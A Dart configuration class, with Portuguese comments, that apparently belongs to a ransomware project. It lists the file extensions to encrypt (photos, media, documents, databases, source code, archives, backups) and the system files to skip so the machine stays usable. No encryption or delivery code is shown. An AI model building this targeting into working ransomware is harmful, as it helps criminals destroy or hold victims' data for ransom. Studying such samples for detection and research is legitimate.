class Config {
  Config();

  static final extensionsToEncrypt = [
    //'exe,','dll','so','rpm','deb','vmlinuz','img'//Arquivos do Sitema
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', //imagens
    'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff',
    'ape', //Audios
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf',
    '3gp', //Vídeos
    'doc', 'docx', 'xls', 'xlsx', 'ppt',
    'pptx', //Microsoft office, OpenOffice,Adobe,Latex,Markdown,etc
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'yml',
    'yaml', 'json', 'xml', 'csv', //dados estruturados e config
    'db', 'sql', 'dbf', 'mdb', 'iso', //bancos de dados e imagens de disco
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp',
    'css', //tecnologias web
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', //Código fonte C e C++
    'java', 'class', 'jar', //Códigos fonte Java
    'ps', 'bat', 'vb', //Scripts de sistemas windows
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', //Scripts de sistemas unix
    'go', 'py', 'pyc', 'bf', 'coffee', //Outros tipos decódigos fonte
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar',
    'bak', //Arquivos compactados e Backups
    'txt'
  ];

  static final extensionsToIgnore = [
    'exe', 'dart', 'mart', 'dll', 'so', 'rpm', 'deb', 'vmlinuz',
    'img' //Arquivos do Sitema
  ];
}
